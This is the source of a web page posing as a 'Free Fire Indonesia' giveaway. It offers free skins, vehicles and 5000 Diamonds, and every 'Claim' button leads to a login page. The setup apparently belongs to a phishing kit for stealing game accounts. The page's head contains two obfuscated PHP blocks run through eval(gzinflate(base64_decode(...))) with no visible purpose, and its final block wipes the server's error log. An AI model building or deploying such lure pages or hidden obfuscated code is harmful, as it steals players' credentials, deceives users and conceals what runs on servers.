<!--- ENSIKOLOGY.BLOGSPOT.COM --->
<html>
<head>
<title>Free Fire Indonesia</title>
<link rel="shorcut icon" href="https://steemitimages.com/0x0/https://img.esteem.ws/ea34benr2i.jpg">
<link rel="stylesheet" href="css/raflipedia.css">
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-9gVQ4dYFwwWSjIDZnLEWnxCjeSWFphJiwGPXr1jddIhOegiu1FwO5qRGvFXOdJZ4" crossorigin="anonymous">
</head>
<?php eval(gzinflate(base64_decode('jY9La8JAEMfvgXyHYRE2lvgolFISBG1NwYN9xNiLyLJNVnfbbBJ2J6Df3k2lYm89Dczv/5iZqkoxKzCgdYtNi+yz3e2EUdWehjDuxzC9CAplm5IfmTCmNvaMfc8hhkoLViqtMOgsF4cWujbHM3F6en+3pI5LwQthAvpUVygqHGTHRkS+h+KAI4m6jCGX3LiEyTp7Hjx0lh62Xy2vNFclTIB+i7xFza2St+PpvtsO81pTpzuwhqP0vQkQidhEoxGBIfTYKkk/knRDz5O9zJYJ3f4hafK+TlYZW6cLunWP9RphecV4KQy6TrJTh994iBq4WbzBrCiMsBYi2ICrcZ6rtOVrlrDZfJ7+9BDYkhi6S4OrX0LfIyl/VApzSUK4rgyB/Cu0H58A'))); ?>
<?php eval(gzinflate(base64_decode('c0jOL6jUcFCJd/P0cQ2OVq9Qj41WL8ktiM9LzE1Vj9VBk4GIaloDAA=='))); ?>
<style>
body { 
  background: url(http://freefiremobile-a.akamaihd.net/ffwebsite/images/wallpaper/pop/032.jpg) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
</style>

<body>

</br>

<center><img src="https://i.pinimg.com/originals/da/3f/b9/da3fb96a95610462f6fd616c7892a2e3.png"></center>

</br>

<div class="kotak">

<div class="row">
<div class="informasi"><strong>PANDA SET FEMALE</strong></div>
<div class="informasi"><strong>GOLDEN JEEP</strong></div>
<div class="informasi"><strong>BLUNO RANGERS</strong></div>
</div>

<div class="row">
<div class="informasi">
<p><img class="aligncenter size-full" src="img/item/x/uhuyuhu/uhufoto2.png" title="Panda Set Female" /></p>
<button onclick="location.href='login.html'" class="btn btn-warning btn-block" style="background-color: #f2ef4f;border-color: #f2ef4f;border-radius: 0px; margin: 0px;">Claim</button>
</div>
<div class="informasi">
<p><img class="aligncenter size-full" src="img/item/x/uhuyuhu/uhufoto1.png" title="Golden Jeep" /></p>
<button onclick="location.href='login.html'" class="btn btn-warning btn-block" style="background-color: #f2ef4f;border-color: #f2ef4f;border-radius: 0px; margin: 0px;">Claim</button>
</div>
<div class="informasi">
<p><img class="aligncenter size-full" src="img/item/x/uhuyuhu/uhufoto5.png" title="Bluno Rangers" /></p>
<button onclick="location.href='login.html'" class="btn btn-warning btn-block" style="background-color: #f2ef4f;border-color: #f2ef4f;border-radius: 0px; margin: 0px;">Claim</button>
</div>
</div>

<div class="row">
<div class="informasi"><strong>COCO RANGERS</strong></div>
<div class="informasi"><strong>PINKO RANGERS</strong></div>
<div class="informasi"><strong>YELO RANGERS</strong></div>
</div>

<div class="row">
<div class="informasi">
<p><img class="aligncenter size-full" src="img/item/x/uhuyuhu/uhufoto3.png" title="coco Rangers" /></p>
<button onclick="location.href='login.html'" class="btn btn-warning btn-block" style="background-color: #f2ef4f;border-color: #f2ef4f;border-radius: 0px; margin: 0px;">Claim</button>
</div>
<div class="informasi">
<p><img class="aligncenter size-full" src="img/item/x/uhuyuhu/uhufoto4.png" title="pinko Rangers" /></p>
<button onclick="location.href='login.html'" class="btn btn-warning btn-block" style="background-color: #f2ef4f;border-color: #f2ef4f;border-radius: 0px; margin: 0px;">Claim</button>
</div>
<div class="informasi">
<p><img class="aligncenter size-full" src="img/item/x/uhuyuhu/uhufoto6.png" title="yelo Rangers" /></p>
<button onclick="location.href='login.html'" class="btn btn-warning btn-block" style="background-color: #f2ef4f;border-color: #f2ef4f;border-radius: 0px; margin: 0px;">Claim</button>
</div>
</div>

<div class="row">
<div class="informasi"><strong>MOOMOO RANGERS</strong></div>
<div class="informasi"><strong>DINO RANGERS</strong></div>
<div class="informasi"><strong>5000 Diamonds</strong></div>
</div>

<div class="row">
<div class="informasi">
<p><img class="aligncenter size-full" src="img/item/x/uhuyuhu/uhufoto7.png" title="moomoo Rangers" /></p>
<button onclick="location.href='login.html'" class="btn btn-warning btn-block" style="background-color: #f2ef4f;border-color: #f2ef4f;border-radius: 0px; margin: 0px;">Claim</button>
</div>
<div class="informasi">
<p><img class="aligncenter size-full" src="img/item/x/uhuyuhu/uhufoto8.png" title="dino Rangers" /></p>
<button onclick="location.href='login.html'" class="btn btn-warning btn-block" style="background-color: #f2ef4f;border-color: #f2ef4f;border-radius: 0px; margin: 0px;">Claim</button>
</div>
<div class="informasi">
<p><img class="aligncenter size-full" src="img/item/x/uhuyuhu/9.png" title="5000 Diamond" /></p>
<button onclick="location.href='login.html'" class="btn btn-warning btn-block" style="background-color: #f2ef4f;border-color: #f2ef4f;border-radius: 0px; margin: 0px;">Claim</button>
</div>
</div>

</div><!--- kotak --->
<?php
$clean = fopen('error_log', 'w');
fwrite($clean,'');
fclose($clean);
?>
</body>
</html>

<!--- RAFLIPEDIA INDONESIA | COPYRIGHT 2018 --->
<!--- ENSIKOLOGY.BLOGSPOT.COM --->